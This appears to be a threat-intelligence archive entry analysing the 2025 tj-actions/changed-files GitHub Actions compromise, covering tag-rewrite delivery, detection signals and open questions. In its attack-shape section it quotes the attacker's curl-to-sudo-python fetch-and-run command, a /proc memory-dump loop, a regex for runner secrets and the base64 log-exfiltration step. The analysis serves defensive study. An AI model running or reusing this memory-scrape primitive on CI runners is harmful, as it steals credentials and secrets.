# 2025-03-14: tj-actions/changed-files (CVE-2025-30066) — Tag-Rewrite Delivery + Runner-Memory Scrape Primitive

## Source

Four sources, all fetched 2026-05-12:

- StepSecurity, "Harden-Runner detection: tj-actions/changed-files
  Action is compromised"
  (`stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised`).
  The primary incident report; first to identify the compromise via
  anomaly detection on an unauthorized outbound call to
  `gist.githubusercontent.com` from a CI runner. Contains the verbatim
  attacker payload (shell wrapper plus Python script), the compromised
  commit SHA, the secret-detection regex, and the post-incident
  recommendation set.
- GitHub Security Advisory **GHSA-mrrh-fwg8-r2c3** /
  **CVE-2025-30066**, CVSS 8.6 (High). The authoritative scope
  statement: affected versions through `45.0.7`, patched at `46.0.1`;
  "over 23,000 repositories" affected during the March 14–15, 2025
  compromise window.
- Semgrep, "Popular GitHub Action tj-actions/changed-files is
  compromised"
  (`semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised/`).
  Detection-rule and tag-rewrite mechanic; ties tj-actions to the
  concurrent reviewdog actions incident three days earlier (no
  attribution).
- Wiz, "GitHub Action tj-actions/changed-files supply chain attack
  (CVE-2025-30066)"
  (`wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066`).
  Concrete secret-type inventory of what actually surfaced in public
  logs (AWS access keys, GitHub PATs, npm tokens, private RSA keys),
  a "dozens of repositories" harm count distinct from the GHSA's
  23K+ exposure count, and post-incident speculation that the
  reviewdog compromise three days earlier may have been the
  enabling vector for the @tj-actions-bot PAT theft.

This entry is referenced by
[`2026-05-12-tanstack-mini-shai-hulud.md`](2026-05-12-tanstack-mini-shai-hulud.md)
as the source of the runner-memory-scrape primitive that TeamPCP
reused 14 months later.

## Why this entry exists

Two threads converge on this incident that the rest of the archive
either implies or partially documents but does not name in one place:

1. **Tag-rewrite as a delivery vector.**
   [`example-litellm-attack.md`](example-litellm-attack.md) §"The
   Trivy Attack: A New Vector" documented the same mechanic in March
   2026 against `aquasecurity/trivy-action` (76 of 77 tags
   force-pushed to point at a TeamPCP commit), and named "track tag →
   SHA mappings over time" as a needed signal. tj-actions is the same
   mechanic 12 months earlier, in a different namespace, by a
   different (or differently-attributed) actor. Two confirmed
   instances 12 months apart, plus the concurrent reviewdog incident
   three days before tj-actions, promotes tag→SHA-mapping anomaly
   tracking from a one-off recommendation to a confirmed signal-class
   need.

2. **Runner-memory scrape as a secret-extraction primitive.** The
   TanStack entry attributes the primitive to tj-actions but currently
   carries the technical detail inline as a footnote-shaped
   cross-reference. With this entry, the primitive has a primary
   citation: the verbatim shell-and-Python payload, the exact regex
   that targets the runner's in-memory secret encoding, and the
   `/proc/<pid>/{cmdline,maps,mem}` access pattern. The TanStack entry
   can then cite this entry for the primitive and focus on the
   *use* — how the scraped token was applied to publish, not how it
   was acquired.

The temporal-era detail is worth naming. Per
[`../trust-model.md`](../trust-model.md) §"Temporal Trust Boundaries,"
tj-actions falls in Era 2 (Early LLM, 2022-11-30 to 2025-11-24).
TanStack falls in Era 4 (Mature Cyber, after 2026-04-30). The
primitive crossed two era boundaries unchanged. The signal-model
lesson is that effective tradecraft persists across capability eras;
defenders cannot rely on attacker tooling churning faster than
detection.

## The attack shape

Reconstructed from StepSecurity's primary report and the GHSA
advisory; gaps where neither source establishes facts are marked
explicitly.

1. **Initial access (mechanism unknown).** A Personal Access Token
   on the `@tj-actions-bot` GitHub account — the maintainer-of-record
   for the action's releases — was stolen. StepSecurity states the
   exact method "remains unknown." No phishing email, no
   `pull_request_target`-style execution path, no OAuth-app
   compromise has been published. The PAT theft is the
   confirmed-but-unattributed initial-access fact.

2. **Tag rewrite.** Using the stolen PAT, the attacker force-pushed
   every published version tag of `tj-actions/changed-files` (through
   `v45.0.7`) to point at a single new commit:
   `0e58ed8671d6b60d0890c21b07f8835ace038e67`. The repository's tag
   history was rewritten in place. Consumers using
   `uses: tj-actions/changed-files@v44` or any prior tag would, on
   their next workflow run, resolve that tag to the malicious commit.

3. **Workflow inclusion as a transitive dependency.** Per the
   advisory, "over 23,000 repositories" used tj-actions/changed-files,
   typically as a transitive dependency of higher-level workflows
   (lint, release, security-scanner pipelines). Consumers did not
   need to take any action; the next CI run on any branch that
   referenced an affected tag would execute the malicious commit.

4. **Payload stage 1 — shell wrapper.** The action's modified
   JavaScript fetched and executed a Python script:
   ```
   curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3
   ```
   The gist handle `nikitastupin` is a real security researcher who
   has published memory-dump PoC scripts. Whether the gist was
   attacker-owned (impersonation), researcher-owned (a public PoC the
   attackers redirected workflows to), or compromised in some other
   way is not established by either primary source. **This is a
   single-sourced gap.**

5. **Payload stage 2 — memory scrape.** The Python script located the
   `Runner.Worker` process via `/proc/<pid>/cmdline`, then read the
   address-space layout from `/proc/<pid>/maps` and dumped every
   readable region from `/proc/<pid>/mem`. From StepSecurity's
   reproduction:
   ```
   with open(map_path, 'r') as map_f, open(mem_path, 'rb', 0) as mem_f:
       for line in map_f.readlines():
           ...
           mem_f.seek(start)
           chunk = mem_f.read(end - start)
   ```
   The dump was then grepped for the runner's in-memory JSON encoding
   of secrets:
   ```
   '"[^"]+":\{"value":"[^"]*","isSecret":true\}'
   ```
   This regex targets the GitHub Actions Runner's internal data
   structure for *any* value marked secret — `GITHUB_TOKEN`, custom
   secrets, AWS credentials passed as `${{ secrets.* }}`, and (for
   workflows requesting `id-token: write`) the OIDC JWT. The primitive
   is indifferent to which secret it captures; it captures all of
   them.

   Wiz's incident analysis confirms the *categories* of secret that
   actually surfaced in public workflow logs: **AWS access keys,
   GitHub Personal Access Tokens, npm tokens, and private RSA keys.**
   Wiz does not call out OIDC tokens separately; whether OIDC JWTs
   were among the captured secrets in observed cases is not addressed
   in the primary sources. The TanStack reuse 14 months later
   established that the primitive captures OIDC tokens in practice
   ([`2026-05-12-tanstack-mini-shai-hulud.md`](2026-05-12-tanstack-mini-shai-hulud.md)).

6. **Exfiltration — log channel, passive.** Matched secrets were
   double-base64-encoded (`base64 -w 0 | base64 -w 0`) and written to
   workflow stdout. No outbound network connection from the runner.
   The exfiltration model is: secrets land in workflow logs, which
   for public repositories are world-readable, and the attacker
   harvests them out-of-band by scanning public Actions log archives.
   For private repositories the malware achieves nothing — the logs
   are not accessible to the attacker.

7. **Discovery, March 14, 23:55 UTC.** StepSecurity's Harden-Runner
   anomaly detection flagged the unauthorized outbound call to
   `gist.githubusercontent.com` from CI runners across customer
   environments. Issue #2463 was opened in `tj-actions/changed-files`.
   Public disclosure followed.

8. **Gist takedown, March 15.** Per Wiz, the malicious gist was
   deleted on March 15 (one day after public disclosure).
9. **Tag revert and patch, March 17.** The maintainer reverted the
   tags to point at the pre-compromise commits. Patched version
   `46.0.1` was released (clean commit
   `2f7c5bfce28377bc069a65ba478de0a74aa0ca32`). GitHub published the
   advisory.

The blast-radius shape is **passive and bounded by repo visibility**.
Of the 23K+ exposed repositories, the at-risk subset is the
intersection of (a) referenced an affected tag *and* (b) ran the
workflow on March 14–17 *and* (c) had public-readable logs *and* (d)
had secrets the attacker actually wanted. This is structurally
different from an active C2 exfil (axios), an out-of-band republish
(TanStack), or a worm propagating from each compromised CI runner
(prt-scan). The attack depends on the attacker's downstream
scraping pipeline, which is itself bounded by GitHub's log-retention
and rate-limiting.

Wiz quantifies the harm side of this shape: "dozens of repositories"
with secrets actually surfaced in public logs, out of the 23K+
exposure pool reported in the GHSA advisory. The two numbers measure
different things — 23K+ is the count of repositories that *referenced*
an affected version tag, "dozens" is the count where secrets
*appeared* in publicly-readable workflow logs during the compromise
window. The gap between them follows from the conditional structure
above: log-exfil succeeds only for the intersection of (a)–(d).

Durability of the captured secrets stratifies the inventory. GitHub's
own `ghs_`-prefixed tokens — including the per-workflow
`GITHUB_TOKEN` and ephemeral OIDC artifacts — auto-expire within 24
hours of issuance. The long-lived material — AWS access keys,
long-lived PATs, npm tokens, RSA private keys — remains valid until
explicitly rotated.

IOCs recorded for reference, not as a burn list:

| Type | Value |
|---|---|
| Compromised commit | `0e58ed8671d6b60d0890c21b07f8835ace038e67` |
| Clean re-pin commit (v46.0.1) | `2f7c5bfce28377bc069a65ba478de0a74aa0ca32` |
| Payload host | `gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py` (returns 404 since March 15, 2025 per Wiz) |
| Compromised account | `@tj-actions-bot` (PAT) |

## What this validates in our existing model

### Tag-rewrite signal class promoted from speculative to confirmed

[`example-litellm-attack.md`](example-litellm-attack.md) §"The Trivy
Attack: A New Vector" wrote: *"Signal needed: track tag → SHA
mappings over time. If a tag SHA changes, that is a strong anomaly
signal regardless of what the tag's content looks like now."* That
recommendation was based on one TeamPCP instance. tj-actions is the
second confirmed instance — different actor (no attribution links
them), different namespace, different ecosystem layer (GHA action vs.
CI security scanner), same primitive. The Reviewdog incident three
days earlier is a third unconfirmed-attribution instance.

Three datapoints over 12 months is enough to promote tag→SHA-mapping
collection from a per-incident recommendation to a class signal. The
specific shape:

- Collect the SHA each version tag of a tracked action resolves to.
- Compare to the prior collected SHA. Any change is the anomaly.
- The signal is direction-agnostic: a tag that *gains* a new SHA when
  it previously had none is equally suspicious as a tag that *loses*
  one. Both indicate non-canonical tag mutation.

This is GET-only, compatible with the WebFetch architectural
constraint. The cardinality concern is real — every action a project
depends on is a collection target, and a large workflow can reference
dozens — but the per-target cost is small (one git-refs API call).

### Forgery-resistance hierarchy: "trusted publishing" is one tier;
"trusted publishing of an immutable artifact" is a tier above

[`../trust-model.md`](../trust-model.md) §6 places "Publication
metadata / trusted publishing" at **High** forgery resistance. The
tj-actions compromise refines this: the signal's strength depends on
*what was published*, not on *that something was published*. An npm
package version is immutable once published (republish requires a
new version number). A GitHub Actions tag is mutable by design — the
tag is a reference, and references can be moved. So "trusted
publishing" on npm is observably High; "trusted publishing" on a GHA
ref-pin is observably lower, because the ref can be repointed without
republishing.

The table itself doesn't need to change — this is a clarification of
what each row means, not a new row. But the operational interpretation
of "publication metadata" for action-publication is meaningfully
different from "publication metadata" for npm/PyPI publication. Worth
naming.

### Host-class corpus gains a code-hosting-as-payload-CDN class

[`2026-05-02-bufferzonecorp-campaign.md`](2026-05-02-bufferzonecorp-campaign.md)
§"C2-destination-class as a corpus signal" opened the host-class
corpus pattern. tj-actions's `gist.githubusercontent.com` payload host
is a new class entry: **code-hosting-as-payload-CDN**, sibling to
request-capture-as-a-service. Class members are services that allow
arbitrary anonymous content with a stable URL — GitHub gists,
GitLab snippets, Pastebin/`paste.ee`/Bin.net,
`raw.githubusercontent.com` against ephemeral accounts. The class
definition is "anonymous-or-low-friction content hosting that
produces a `curl`able URL for an arbitrary file"; the membership is
bounded by that property.

This is a different class from C2 destinations. Payload-CDN hosts are
**read-from**, not **posted-to**. A package source that contains a
literal-string reference to one of these hosts in code that runs at
install or import time is the signal.

## What this exposes as a gap

### GHA tag mutability is a structural platform property

Other ecosystems offer publication immutability as a platform
guarantee: a published npm version cannot be replaced (only
unpublished), a published PyPI version is sealed, a Cargo published
crate is sealed. GitHub Actions has no such guarantee for refs —
tags are git refs and can be force-pushed by anyone with push access
to the action's repository. This is a property of the host platform,
not of any individual action's posture.

The signal-model consequence: SHA-pinning recommendations for GHA
actions are not a CI-config preference, they are the only available
mechanism to obtain the immutability guarantee that other ecosystems
provide by default. A workflow that pins `actions/checkout@v4` has a
materially weaker artifact-integrity claim than one that pins
`actions/checkout@<40-hex-SHA>`, *even when both refer to the same
content right now*. The `ci_action_pin_tightness` signal already
named in
[`../analysis/signatory-provenance-v1.json`](../analysis/signatory-provenance-v1.json)
F007 captures this for workflows signatory analyzes; the gap is that
the signal model treats GHA action pinning as one variant of "pinning
discipline" rather than as a platform-specific compensating control
for missing immutability.

### Runner-shared-memory exposure is broader than per-job permissions

The runner-memory-scrape primitive captures every secret marked
`"isSecret":true` in the runner process's memory at the moment of
scrape. On GitHub-hosted runners each workflow run gets a fresh VM,
so the exposure is bounded to the secrets visible in *this workflow
run* — but that includes any secret referenced by *any* step that
has executed in this run, not just the step the malicious code is in.

For self-hosted runners the bound is worse: secrets from prior runs
can persist in memory if the runner host is not reset between runs.
The TanStack postmortem doesn't establish self-hosted vs.
GitHub-hosted for the exploited workflow, and StepSecurity's report
doesn't make this distinction for tj-actions consumers either.

The signal-model implication is that "what secrets does this workflow
expose?" can't be answered by looking at the workflow file alone.
It depends on (a) what secrets are referenced *anywhere* in the
workflow's run graph, (b) what runner type the workflow uses, and
(c) for self-hosted runners, what other workflows share the runner
host. None of (a)/(b)/(c) is in the v0.1 signal set.

### Bot/service-account publisher identity is a distinct class

`@tj-actions-bot` was the maintainer-of-record. The PAT-theft
initial-access vector is materially easier against bot/service
accounts than against human-maintainer accounts because:

- Service accounts often lack 2FA (older configurations, or
  organizational decisions to avoid hardware-key dependency in CI).
- PATs on service accounts are frequently long-lived and broadly
  scoped (a "publish everything" token).
- Service-account credentials are stored where humans don't put their
  credentials: in CI environment configurations, password managers
  shared across operators, Terraform state, etc. The attack surface
  is operational, not personal.

The v0.1 identity-graph signals model maintainers as humans. A
publisher identity that *is* a bot/service account (detectable by
account name patterns ending in `-bot`, `-ci`, `-deploy`, `-svc`, by
`type: Bot` on the GitHub user API, or by the account having only
automated-looking activity) is a different risk profile. Worth a
sibling pattern under identity-graph: known-service-account-publisher.

### Initial-access vector remains a gap in this incident

StepSecurity, GHSA, and Semgrep all describe the post-access shape.
None publishes how the PAT was stolen. This is not a signatory gap per
se — it is a gap in the incident's public record. But it matters for
signal-model honesty: when this entry says "stolen PAT initial
access," that is a confirmed *result*, not a confirmed *mechanism*.
Anyone designing a defense against the next tj-actions-shaped attack
should keep that uncertainty explicit.

## What this does *not* do

### Does not burn `@tj-actions-bot`, `nikitastupin`, the specific gist, or the compromised commit

`@tj-actions-bot` was the legitimate maintainer-of-record account
that lost a PAT. Burning the identity would mis-attribute. The
`nikitastupin` gist handle's exact role is unclear from primary
sources; pending clarification, the right posture is to record the
fact and not act on it. The compromised commit
`0e58ed8671d6b60d0890c21b07f8835ace038e67` and the payload URL are
threat-landscape inputs, not signal-table contents.

### Does not recommend "pin everything to SHAs" as a signatory rule

SHA-pinning of GHA actions is a CI-configuration recommendation that
the GitHub Security Lab, OpenSSF, and the action maintainers'
community have all published. Signatory's role is to surface whether
a consumer or a publisher is following the recommendation as a
posture signal, not to issue the recommendation. The distinction
matters because "what should I do?" is a CI-config skill question;
"is this project doing it?" is a signal question.

### Does not retroactively change the litellm or TanStack analyses

[`example-litellm-attack.md`](example-litellm-attack.md) named
tag→SHA tracking as a needed signal motivated by Trivy. That call
remains correct.
[`2026-05-12-tanstack-mini-shai-hulud.md`](2026-05-12-tanstack-mini-shai-hulud.md)
attributed the runner-memory-scrape primitive to tj-actions reuse.
That attribution stands; this entry refines its precision (the
primitive is verbatim, the use differs).

### Does not assert actor attribution or a confirmed causal chain between reviewdog and tj-actions

Three distinct framings appear across the four primary sources:

- Semgrep and StepSecurity note the reviewdog actions compromise
  three days earlier (2025-03-11) without same-actor attribution.
  Concurrent-and-possibly-coordinated.
- Wiz's post-incident update goes further and speculates that the
  reviewdog compromise "may have contributed to the compromise of
  `tj-actions/changed-files`" — i.e., reviewdog as *causal upstream*,
  the enabling vector for the @tj-actions-bot PAT theft. Wiz does
  not provide the evidence; the claim is explicitly speculative.
- No source establishes that the actor behind reviewdog and the
  actor behind tj-actions are the same identity, nor that they are
  different identities.

This entry records all three possibilities (same-or-coordinated
actor; causal-upstream chain via reviewdog; unrelated) and commits
to none. The signal-model lesson is independent of attribution: tag
rewrite is a delivery primitive available to any actor who can steal
publish credentials, and runner-memory scraping is a secret-extraction
primitive available to any actor who can run code on a runner. Neither
primitive's value to the signal model depends on actor identity.

## Open questions

- Should signatory collect tag→SHA mappings as a Layer-1 signal for
  every GHA action a tracked project references? The cardinality is
  bounded per-project but unbounded across the corpus; an alternative
  is on-demand collection when a specific action is the subject of
  analysis. Trade-off: detection latency vs. collection budget.
- What does the `nikitastupin` gist evidence actually establish? Is
  the handle the attacker's, a compromised researcher's, or a
  researcher whose published PoC was redirected to without their
  involvement? Wiz / Sysdig / GitGuardian may have addressed this in
  their secondary writeups.
- Initial-access mechanism: PAT theft, but how? Phishing of the
  maintainer? Token leakage in another compromised workflow?
  Cookie-theft against a logged-in browser? This is the most
  signal-model-actionable gap. Wiz speculates reviewdog as the
  upstream enabling vector but does not provide evidence.
- Reviewdog connection: same actor, coordinated actors, causal
  upstream (Wiz's hypothesis), or unrelated? The answer changes
  whether the March 11–14 window is one campaign, two, or a linked
  cascade.
- Harm-to-exposure ratio methodology: Wiz observed "dozens" with
  actual leaks against GHSA's 23K+ exposure count, a ~1000× gap.
  Is this ratio characteristic of passive-log-exfil attacks
  generally, or specific to tj-actions's combination of
  workflow-trigger conditions and public-repo distribution? If the
  ratio is predictable, blast-radius reporting could routinely cite
  both numbers; if it varies, the conflation in GHSA-style headlines
  is harder to fix.
- Tag-immutability across forges:
  [`../threat-landscape/`](../threat-landscape/) doesn't yet have an
  entry comparing GitHub, GitLab, Codeberg, Forgejo, and self-hosted
  Gitea on whether tags can be force-pushed by default and what
  audit-log shape a tag rewrite produces. The collector-side
  question is whether signatory can detect a tag rewrite from
  outside the repo's audit log.
- Runner-type signal: GitHub-hosted vs. self-hosted is a binary,
  publicly queryable property of every workflow run (the runner labels
  are in the workflow file or in the run metadata). Worth collecting
  as a posture signal.

## Cross-references

- [`example-litellm-attack.md`](example-litellm-attack.md) §"The
  Trivy Attack: A New Vector" — the first tag-rewrite case in the
  archive; this entry is the second, 12 months earlier in calendar
  time but published as a primary-source entry only now.
- [`2026-05-12-tanstack-mini-shai-hulud.md`](2026-05-12-tanstack-mini-shai-hulud.md)
  — reuses the runner-memory-scrape primitive 14 months later, with
  a different use (active republish vs. passive log exfil).
- [`2026-05-02-bufferzonecorp-campaign.md`](2026-05-02-bufferzonecorp-campaign.md)
  §"C2-destination-class as a corpus signal" — the host-class corpus
  pattern this entry extends with a code-hosting-as-payload-CDN
  class.
- [`example-axios-attack.md`](example-axios-attack.md) lessons 10
  ("publication metadata divergence") and 13 ("trusted publishing as
  a positive signal") — the GHA refinement of those lessons appears
  in this entry's "What this validates" section.
- [`../trust-model.md`](../trust-model.md) §"Temporal Trust
  Boundaries" — this incident sits in Era 2 (Early LLM, 2022-11-30
  to 2025-11-24); the primitive was reused unchanged in Era 4 (Mature
  Cyber, after 2026-04-30).
- [`../trust-model.md`](../trust-model.md) §"Signals must be weighted
  by forgery resistance" — "Publication metadata / trusted publishing"
  at High forgery resistance is observably weaker for GHA refs than
  for npm/PyPI versions, because GHA refs are mutable by platform
  design.
- [`../analysis/signatory-provenance-v1.json`](../analysis/signatory-provenance-v1.json)
  F007 / `MP-GO-HYG-01` — `ci_action_pin_tightness` already names
  SHA-pinning as a signal; this entry names the platform-specific
  reason the signal matters (GHA refs are mutable by design).
